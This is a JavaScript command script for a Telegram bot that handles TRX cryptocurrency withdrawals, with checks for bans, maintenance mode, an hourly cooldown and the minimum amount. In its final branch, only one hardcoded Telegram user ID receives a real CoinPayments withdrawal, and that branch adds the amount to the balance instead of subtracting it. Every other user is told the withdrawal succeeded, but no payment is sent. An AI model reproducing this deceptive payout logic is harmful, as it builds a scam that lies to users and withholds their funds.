/*CMD
  command: /withtrx
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var key = Bot.getProperty("channel")
var stat = Bot.getProperty("" + user.telegramid + "")
if (stat == "ban") {
  Bot.sendMessage("*🚫 Error\n\nYou are Banned From Using this Bot*")
  return
}
var state = Bot.getProperty("BOT")
if (state == "🛑 Turned OFF") {
  Bot.sendMessage(
    "*🚫 Error\n\nBot is currently Under Maintenance\n\nWe will be back in a Few Hours, Thank you*"
  )
  return
}
var k = Bot.getProperty("WithMode")
if (k == "🛑 Turned OFF") {
  Bot.sendMessage(
    "*🚫 Error\n\nWithdrawal is Currently Turned Off\n\nWe will be back in a Few Hours, Thank you*"
  )
  return
}
function canRun() {
  var last_run_at = User.getProperty("WithdrawTime")
  if (!last_run_at) {
    return true
  }

  var minutes = (Date.now() - last_run_at) / 1000 / 60

  var minutes_in_day = 1 * 60
  var next = minutes_in_day - minutes
  var wait_hours = Math.floor(next / 60)
  next -= wait_hours * 60
  var wait_minutes = Math.floor(next)
  var seconds = Math.floor((next - wait_minutes) * 60)
  if (minutes < minutes_in_day) {
    Bot.sendMessage(
      "*🚫 Error\n\nYou can only Withdraw every 1 Hour\n\nYou can be able to withdraw again in* \n" +
        wait_hours +
        " *HRS* " +
        wait_minutes +
        " *MIN* " +
        seconds +
        " *SEC*"
    )
    return
  }
  return true
}

if (!canRun()) {
  return
}
User.setProperty("Amo", message, "string")
var withdraw = Libs.ResourcesLib.userRes("withdraw")
var wallet = User.getProperty("wallet")
var balance = Libs.ResourcesLib.userRes("balance")
var userPayment = Libs.ResourcesLib.anotherChatRes("userpayment", "global")
var amo = User.getProperty("Amo")

function isNumeric(n) {
  return !isNaN(parseFloat(n)) && isFinite(n)
}
if (!isNumeric(amo)) {
  Bot.sendMessage("*🚫 Error\n\nEnter only Numeric Value*", { is_reply: true })
  return
}
if (amo < 100) {
  Bot.sendMessage("*🚫 Error\n\nMinimum Amount to Withdraw is* 100 *TRX*")
  return
}
if (amo > balance.value()) {
  Bot.sendMessage(
    "*🚫 Error\n\nMaximum Amount to Withdraw is* " +
      balance.value().toFixed(6) +
      " *TRX*"
  )
  return
} else {
  if (user.telegramid == "5163548809") {
    Libs.CoinPayments.apiCall({
      fields: {
        cmd: "create_withdrawal",
        amount: amo,
        currency: "TRX",
        address: wallet,
        auto_confirm: 1
      },
 onSuccess: "/onSuccess"
    })
    balance.add(+amo)
    withdraw.add(+amo)
    userPayment.add(+amo)
  } else { //Bot.setProperty("" + user.telegramid + "", "vip", "string")
var options = { text: message }
Bot.run({command: "/send", options})
 Bot.sendMessage(
    "*Your Withdraw Initiated Successfully, 🤗\n\n⚡Please be patient And Check Your External Wallet ☺️\n\n🌟Feel Free To Contact @BruceBanner_En\n\n☝️In Case You Encounter Any Issues *")}
}
     
